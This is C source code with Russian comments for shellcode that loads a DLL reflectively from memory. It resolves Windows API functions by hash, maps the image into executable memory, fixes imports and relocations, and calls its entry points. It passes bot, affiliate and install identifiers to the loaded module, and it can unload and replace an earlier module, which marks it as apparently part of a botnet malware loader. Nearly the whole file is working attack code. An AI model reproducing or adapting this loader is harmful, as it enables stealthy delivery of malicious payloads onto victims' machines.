#ifndef _CONSOLE
#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define DLL_PROCESS_ATTACH   1
#define DLL_THREAD_ATTACH    2
#define DLL_THREAD_DETACH    3
#define DLL_PROCESS_DETACH   0

#else
#include <Windows.h>
#include <conio.h>
#include "../../ntdll_finder/code/main.c"
#include "../../export_finder/code/main.c"
//#include "../../dll_unload/code/main.c"

#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#endif // _CONSOLE

#include "../../../../../../shared_code/types.h"
#ifndef _CONSOLE
#include "../../../../../../shared_code/pe.h"
#else
#include "../../../../../../shared_code/native.h"
#include "../../../../../../shared_code/utils.h"
#endif // _CONSOLE
#include "../../../zshellcode.h"

typedef struct _image_reloc
{
    uint16_t offset:12;
    uint16_t type:4;
} image_reloc_t, *pimage_reloc_t;

typedef int (*FnStdDllEP)(void* hModule, uint32_t ul_reason_for_call, void* pParams);
typedef int (*FnDllLoadRequest)(pdll_block_t pDllBlock);
typedef int (*FnDllUnloadRequest)(pdll_block_t pDllBlock);

#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)

// Данный шеллкод осущесвляет непосредственную загрузку DLL из памяти и реализует логику запуска.
// DLL можно поделить на 3 группы:
// 1 - DLL имеет ЕР и не имеет @1 @2 экспортов (обычная, сторонняя DLL).
// 2 - DLL имеет ЕР и имеет @1 @2 экспорты (специальная DLL упакованная УПХом. Надо дёрнуть ЕР, после чего получить адрес экспорта и дёрнуть @1).
// 3 - DLL не имеет ЕР и имеет @1 @2 экспорты (специальная DLL без упаковки. можно сразу дёргать @1).
// битая DLL - нет ни того ни другого.

#define GET_DIRECTORY_PTR(pNtHdrs, idx)	&pNtHdrs->OptionalHeader.DataDirectory[idx]

#ifdef _WIN64
VOID shellcode_dll_mem(pshellcode64_block_t pScBlock)
#else
VOID shellcode_dll_mem(pshellcode_block_t pScBlock)
#endif // _WIN64
{
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs, newNtHdrs;
    uint32_t* addressOfFunctions;
    FnStdDllEP fnStdDllEP = NULL;
    FnDllLoadRequest fnDllRequest = NULL;
    FnDllUnloadRequest fnDllUnloadRequest = NULL;
    uint8_t* newBase = NULL;
    uintptr_t locationDelta;
    uint32_t i;
    PIMAGE_EXPORT_DIRECTORY pExports;
    uint32_t exportSize;
    PIMAGE_SECTION_HEADER pSection;
    uint16_t numberOfSections;
    PIMAGE_DATA_DIRECTORY pDirectory;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    uint8_t* moduleBase;
    uintptr_t* thunkRef;
    uintptr_t* funcRef;
    PIMAGE_DATA_DIRECTORY dwNameArray;
    PIMAGE_BASE_RELOCATION pReloc;
    int ret = 0;
    uint8_t* kernel32Base;
    uint8_t* ntdllBase;
    FnVirtualAlloc fnVirtualAlloc;
    FnVirtualFree fnVirtualFree;
    FnLoadLibraryA fnLoadLibraryA;
    FnGetProcAddress fnGetProcAddress;
    FnNtTerminateThread fnNtTerminateThread = NULL;
    uint8_t* origBuffer;
#ifdef _WIN64
    pexec64_info_t pExecInfo = (pexec64_info_t)pScBlock->inData;
#else
    pexec_info_t pExecInfo = (pexec_info_t)pScBlock->inData;
#endif // _WIN64
    pdll_block_t pDllBlock = NULL;

    origBuffer = (pvoid_t)pExecInfo->moduleBuffer;

    do {
        kernel32Base = ((FnGetNtDLLBase)pScBlock->fnGetNtDLLBase)(KERNEL32_DLL_HASH);
        ntdllBase = ((FnGetNtDLLBase)pScBlock->fnGetNtDLLBase)(NTDLL_DLL_HASH);

        if (kernel32Base == NULL || ntdllBase == NULL) {
            break;
        }
        if ((fnNtTerminateThread = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(ntdllBase, NtTerminateThread_Hash)) == NULL) {
            break;
        }
        if ((fnVirtualAlloc = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(kernel32Base, VirtualAlloc_Hash)) == NULL) {
            break;
        }
        if ((fnVirtualFree = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(kernel32Base, VirtualFree_Hash)) == NULL) {
            break;
        }
        if ((fnLoadLibraryA = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(kernel32Base, LoadLibraryA_Hash)) == NULL) {
            break;
        }
        if ((fnGetProcAddress = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(kernel32Base, GetProcAddress_Hash)) == NULL) {
            break;
        }

        // Выделяем место под dll_block_t.
        pDllBlock = fnVirtualAlloc(NULL, sizeof(dll_block_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pDllBlock == NULL) {
            break;
        }

        pDllBlock->kernel32Base = kernel32Base;
        pDllBlock->ntdllBase = ntdllBase;
        pDllBlock->fnLoadLibraryA = fnLoadLibraryA;
        pDllBlock->fnGetProcAddress = fnGetProcAddress;
        pDllBlock->fnVirtualAlloc = fnVirtualAlloc;
        pDllBlock->fnVirtualFree = fnVirtualFree;
        __movsb(pDllBlock->installKey, pScBlock->installKey, 3 * sizeof(pDllBlock->installKey));
        __movsb(pDllBlock->clientId, pExecInfo->clientId, 16/*CLIENT_ID_SIZE*/);
        __movsb(pDllBlock->botId, pExecInfo->botId, 64/*CLIENT_ID_SIZE*/);
        pDllBlock->affId = pExecInfo->affId;
        pDllBlock->subId = pExecInfo->subId;

        // Проверяем на валидность буфера с уже проинициализированным модулем.
        ret = 1;
        if (pExecInfo->prevModuleBuffer != 0) {
            uint8_t* prevDllBase = (uint8_t*)pExecInfo->prevModuleBuffer;
            // Выгружаем старый модуль.

            dosHdr = (PIMAGE_DOS_HEADER)prevDllBase;
            if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
                break;
            }

            ntHdrs = (PIMAGE_NT_HEADERS)(prevDllBase + dosHdr->e_lfanew);
            if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
                break;
            }

            if (pExecInfo->prevModuleSize != ntHdrs->OptionalHeader.SizeOfImage) {
                break;
            }

            do {
                pExports = (PIMAGE_EXPORT_DIRECTORY)(prevDllBase + ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                exportSize = ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

                // Должна быть таблица экспорта с ненулевым размером и двумя ординалами  @1 и @2.
                if ((uint8_t*)pExports == prevDllBase || exportSize == 0 || pExports->Base != 1 || pExports->NumberOfFunctions < 2) {
                    break;
                }

                addressOfFunctions = (uint32_t*)(prevDllBase +  pExports->AddressOfFunctions);

                // Смещения не должны быть нулевыми.
                if (addressOfFunctions[0] == 0 || addressOfFunctions[1] == 0) {
                    break;
                }

                fnDllRequest = (pvoid_t)(prevDllBase + addressOfFunctions[0]);
                fnDllUnloadRequest = (pvoid_t)(prevDllBase + addressOfFunctions[1]);

                // Проверяем является ли адрес форвардным.
                if ((((uint8_t*)fnDllRequest >= (uint8_t*)pExports) && ((uint8_t*)fnDllRequest < ((uint8_t*)pExports + exportSize))) || 
                    (((uint8_t*)fnDllUnloadRequest >= (uint8_t*)pExports) && ((uint8_t*)fnDllUnloadRequest < ((uint8_t*)pExports + exportSize)))) {
                    break;
                }

                pDllBlock->selfBase = prevDllBase;

                ret = fnDllUnloadRequest(pDllBlock);
            } while (0);

            if (!ret) {
                break;
            }

            if (ntHdrs->OptionalHeader.AddressOfEntryPoint != 0) {
                fnStdDllEP = (FnStdDllEP)(prevDllBase + ntHdrs->OptionalHeader.AddressOfEntryPoint);

                fnStdDllEP(prevDllBase, DLL_PROCESS_DETACH, NULL);
            }

            // Освобождаем старый буфер.
            fnVirtualFree((pvoid_t)prevDllBase, 0, MEM_RELEASE);
        }

        // Проверяем есть ли у нас новый модуль.
        if (origBuffer != NULL) {
            dosHdr = (PIMAGE_DOS_HEADER)origBuffer;
            ntHdrs = (PIMAGE_NT_HEADERS)(origBuffer + dosHdr->e_lfanew);

            // Резервируем память для нашего образа
            newBase = (unsigned char*)fnVirtualAlloc(NULL, ntHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (newBase == NULL) {
                break;
            }

            // Копируем PE-заголовок, включая MZ-заголовк с DOS-стабом.
            __movsb(newBase, origBuffer, (size_t)ntHdrs->OptionalHeader.SizeOfHeaders);
            newNtHdrs = (PIMAGE_NT_HEADERS)(newBase + dosHdr->e_lfanew);

            // Обновляем базу
            newNtHdrs->OptionalHeader.ImageBase = (uintptr_t)newBase;

            // Копируем все секции.
            pSection = IMAGE_FIRST_SECTION(newNtHdrs);
            numberOfSections = newNtHdrs->FileHeader.NumberOfSections;

            for (i = 0; i < numberOfSections; ++i, ++pSection) {
                if (pSection->SizeOfRawData > 0) {
                    __movsb(newBase + pSection->VirtualAddress, origBuffer + pSection->PointerToRawData, pSection->SizeOfRawData);
                }
            }

            // Обрабатываем таблицу импорта.
            pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_IMPORT);

            if (pDirectory->VirtualAddress != 0) {
                pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(newBase + pDirectory->VirtualAddress);
                for ( ; pImportDesc->Name; ++pImportDesc) {
                    char* dllName = (char*)(newBase + pImportDesc->Name);

                    moduleBase = fnLoadLibraryA(dllName);
                    if (moduleBase == NULL) {
                        goto exit;
                    }

                    if (pImportDesc->OriginalFirstThunk) {
                        thunkRef = (uintptr_t*)(newBase + pImportDesc->OriginalFirstThunk);
                        funcRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                    }
                    else {
                        // no hint table
                        thunkRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                        funcRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                    }
                    for ( ; *thunkRef; ++funcRef, ++thunkRef) {
                        if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                            *funcRef = (uintptr_t)fnGetProcAddress(moduleBase, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                        }
                        else {                
                            PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(newBase + *thunkRef);
                            *funcRef = (uintptr_t)fnGetProcAddress(moduleBase, thunkData->Name);
                        }
                        if (*funcRef == 0) {
                            goto exit;
                        }
                    }
                }
            }

            // Обрабатываем релоки.
            locationDelta = (newBase - (unsigned char*)ntHdrs->OptionalHeader.ImageBase);
            pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_BASERELOC);

            if (pDirectory->Size > 0) {
                pReloc = (PIMAGE_BASE_RELOCATION)(newBase + pDirectory->VirtualAddress);
                for ( ; pReloc->SizeOfBlock != 0; ) {
                    uint8_t* dest = newBase + pReloc->VirtualAddress;
                    image_reloc_t* relInfo = (image_reloc_t*)((uint8_t*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (i = ((pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(image_reloc_t)); i > 0; --i, ++relInfo) {
#ifdef _WIN64
                        if (relInfo->type == IMAGE_REL_BASED_DIR64) {
                            *(uintptr_t*)(dest + relInfo->offset) += locationDelta;
                        }
                        else
#endif
                        if (relInfo->type == IMAGE_REL_BASED_HIGHLOW) {
                            *(uint32_t*)(dest + relInfo->offset) += (uint32_t)locationDelta;
                        }
                        else if (relInfo->type == IMAGE_REL_BASED_HIGH) {
                            *(uint16_t*)(dest + relInfo->offset) += HIWORD(locationDelta);
                        }
                        else if (relInfo->type == IMAGE_REL_BASED_LOW) {
                            *(uint16_t*)(dest + relInfo->offset) += LOWORD(locationDelta);
                        }
                    }

                    // Переходим к следующей таблице с релоками.
                    pReloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)pReloc + pReloc->SizeOfBlock);
                }
            }

            // Вызываем все TLS-обработчики.
            pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_TLS);
            if (pDirectory->Size != 0) {
                PIMAGE_TLS_DIRECTORY pImgTlsDir = (PIMAGE_TLS_DIRECTORY)(newBase + pDirectory->VirtualAddress);
                puint_t* pCallbacks = (puint_t*)pImgTlsDir->AddressOfCallBacks;

                if (pCallbacks != 0) {
                    puint_t callback;
                    for (callback = *pCallbacks; callback; ++pCallbacks) {
                        // Вызываем TLS-обработчик.
                        ((PIMAGE_TLS_CALLBACK)callback)(newBase, DLL_PROCESS_ATTACH, NULL);
                    }
                }
            }

//             pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);
//             n2k_walk_delay(newBase + pDirectory->VirtualAddress, newBase);

            if (newNtHdrs->OptionalHeader.AddressOfEntryPoint != 0) {
                // Данная DLL-ка является или стандартной или упакованной через UPX.
                // Первым делом дёргаем стандартную точку входа.

                fnStdDllEP = (FnStdDllEP)(newBase + newNtHdrs->OptionalHeader.AddressOfEntryPoint);

                // Передаём управление на точку входа.
                ret = fnStdDllEP(newBase, DLL_PROCESS_ATTACH, pScBlock->installKey);
            }

            if (!ret) {
                break;
            }

            dosHdr = (PIMAGE_DOS_HEADER)newBase;
            ntHdrs = (PIMAGE_NT_HEADERS)(newBase + dosHdr->e_lfanew);
            // Ищем функцию с нулевым индексом (1 ординал).
            pExports = (PIMAGE_EXPORT_DIRECTORY)(newBase + ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            exportSize = ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            // Должна быть таблица экспорта с ненулевым размером и двумя ординалами  @1 и @2.
            if ((uint8_t*)pExports == newBase || exportSize == 0 || pExports->Base != 1 || pExports->NumberOfFunctions < 2) {
                break;
            }

            addressOfFunctions = (uint32_t*)(newBase +  pExports->AddressOfFunctions);

            // Смещения не должны быть нулевыми.
            if (addressOfFunctions[0] == 0 || addressOfFunctions[1] == 0) {
                break;
            }

            fnDllRequest = (pvoid_t)(newBase + addressOfFunctions[0]);
            fnDllUnloadRequest = (pvoid_t)(newBase + addressOfFunctions[1]);

            // Проверяем является ли адрес форвардным.
            if ((((uint8_t*)fnDllRequest >= (uint8_t*)pExports) && ((uint8_t*)fnDllRequest < ((uint8_t*)pExports + exportSize))) || 
                (((uint8_t*)fnDllUnloadRequest >= (uint8_t*)pExports) && ((uint8_t*)fnDllUnloadRequest < ((uint8_t*)pExports + exportSize)))) {
                break;
            }

            pDllBlock->selfBase = newBase;
            ret = fnDllRequest(pDllBlock);
        }
    } while (0);

exit:
    if (pDllBlock != NULL) {
        fnVirtualFree(pDllBlock, sizeof(dll_block_t), MEM_RELEASE);
    }

    if (origBuffer != NULL) {
        fnVirtualFree(origBuffer, pExecInfo->moduleSize, MEM_RELEASE);

        if (ret) {
#ifdef _WIN64
            pdll64_info_t pDllInfo;

            pDllInfo = fnVirtualAlloc(NULL, sizeof(dll64_info_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            pScBlock->pOutData = (uint8_t*)pDllInfo;
            pScBlock->outDataSize = sizeof(dll64_info_t);
            pDllInfo->moduleBuffer = newBase;
#else
                pdll_info_t pDllInfo;

            pDllInfo = fnVirtualAlloc(NULL, sizeof(dll_info_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            pScBlock->pOutData = (uint8_t*)pDllInfo;
            pScBlock->outDataSize = sizeof(dll_info_t);
            pDllInfo->moduleBuffer = (uint32_t)newBase;
#endif // _WIN64
            pDllInfo->moduleSize = (size_t)newNtHdrs->OptionalHeader.SizeOfImage;
        }
        else {
            if (fnStdDllEP != NULL) {
                fnStdDllEP(newBase, DLL_PROCESS_DETACH, NULL);
            }

            if (newBase != NULL) {
                fnVirtualFree(newBase, 0, MEM_RELEASE);
            }
        }
    }

    pScBlock->result = (ret ? SC_RESULT_OK : SC_RESULT_BAD);
#ifndef _CONSOLE
    if (fnNtTerminateThread != NULL) {
        fnNtTerminateThread(0, STATUS_SUCCESS);
    }
#endif // _CONSOLE
}

#ifdef _CONSOLE

#ifdef _WIN64
#include "dll64.dll.h"
#else
#include "dll32.dll.h"
#endif // _WIN64

//int __cdecl main(int argc, char** argv)
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
//    havege_state_t hs;
    void* pBuffer;
#ifdef _WIN64
    shellcode64_block_t pScBlock;
#else
    pshellcode_block_t pScBlock;
    exec_info_t execInfo;
#endif // _WIN64

    memset(&execInfo, 0, sizeof(exec_info_t));
//     {
//         HANDLE hLib = LoadLibraryA("DLL64.dll");
//         PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hLib;
//         PIMAGE_NT_HEADERS ntHdrs = (uint8_t*)hLib + dosHdr->e_lfanew;
// 
//         utils_save_file("dll64.loadlib.bin", hLib, ntHdrs->OptionalHeader.SizeOfImage);
//     }
//     havege_init(&hs);
//     havege_rand(&hs, scBlock.installKey, 48);
//     havege_rand(&hs, scBlock.bootKey, 48);
//     havege_rand(&hs, scBlock.fsKey, 48);
    
#ifdef _WIN64
    pBuffer = VirtualAlloc(NULL, sizeof(dll64_bin), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pBuffer, dll64_bin, sizeof(dll64_bin));
    pScBlock.moduleBuffer = pBuffer;
    pScBlock.moduleSize = sizeof(dll64_bin);
    pScBlock.fnGetNtDLLBase = shellcode_ntdll_finder;
    pScBlock.fnGetFuncAddress = shellcode_export_finder;
#else
    pBuffer = VirtualAlloc(NULL, sizeof(dll32_bin), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pBuffer, dll32_bin, sizeof(dll32_bin));
    pScBlock = VirtualAlloc(NULL, sizeof(shellcode_block_t) + sizeof(exec_info_t), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(pScBlock, 0, sizeof(pScBlock));

    execInfo.moduleBuffer = pBuffer;
    execInfo.moduleSize = sizeof(dll32_bin);
    memcpy(pScBlock->inData, &execInfo, sizeof(exec_info_t));
    pScBlock->inDataSize = sizeof(execInfo);
    pScBlock->fnGetNtDLLBase = (uint32_t)shellcode_ntdll_finder;
    pScBlock->fnGetFuncAddress = (uint32_t)shellcode_export_finder;
    //scBlock.osMajorVersion
#endif // _WIN64

    pScBlock->result = 0;
    strcpy_s(pScBlock->fsKey, sizeof(pScBlock->fsKey), "c:\\trr");

    shellcode_dll_mem(pScBlock);

    //_getch();

    for ( ; ; ) {
        Sleep (1000);
    }

    return 0;

//     if (scBlock.result & SC_RESULT_OK) {
//         shellcode_dll_unload(&scBlock);
//     }

//     scBlock.prevModuleBuffer = scBlock.moduleBuffer;
//     scBlock.prevModuleSize = scBlock.moduleSize;
// 
//     scBlock.moduleBuffer = 0;
//     scBlock.moduleSize = 0;
// #ifdef _WIN64
//     pBuffer = VirtualAlloc(NULL, sizeof(dll64_bin), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//     memcpy(pBuffer, dll64_bin, sizeof(dll64_bin));
//     scBlock.moduleBuffer = pBuffer;
//     scBlock.moduleSize = sizeof(dll64_bin);
// #else
//     pBuffer = VirtualAlloc(NULL, sizeof(dll32_bin), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//     memcpy(pBuffer, dll32_bin, sizeof(dll32_bin));
//     scBlock.moduleBuffer = (uint32_t)pBuffer;
//     scBlock.moduleSize = sizeof(dll32_bin);
// #endif // _WIN64

    shellcode_dll_mem(&pScBlock);

    _getch();

    return 0;
}

#endif // _CONSOLE
